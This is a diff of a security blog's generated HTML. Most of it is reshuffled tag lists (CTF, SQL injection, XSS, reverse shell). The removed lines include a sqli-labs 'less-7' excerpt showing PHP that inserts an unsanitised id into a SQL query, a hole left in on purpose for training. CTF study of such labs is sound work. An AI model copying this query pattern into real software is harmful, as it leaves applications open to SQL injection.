-<h3><span id="less-7">less-7</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in.... Use outfile......'</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br></pre></td></tr></table></figure>
-<h3><span id="less-8">less-8</span></h3><h3><span id="less-9">less-9</span></h3><h3><span id="less-10">less-10</span></h3>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql注入</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/04/25/sqlilabs/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -1649,59 +1213,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">bypass</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">PHP ctf</a>
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">XCTF WriteUP</a>
+                <a href="javascript:void(0)" class="js-tag color4">PHP</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">工具,nmap</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf ssrf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf 文件上传</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">思维导图</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">xss</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">挖洞</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">ctf sql注入</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">工具 sql注入</a>
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1713,11 +1237,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1725,11 +1245,31 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">思维导图</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">PHP</a>
+                <a href="javascript:void(0)" class="js-tag color4">xss</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">反弹shell</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">挖洞</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
             
             <div class="clearfix"></div>
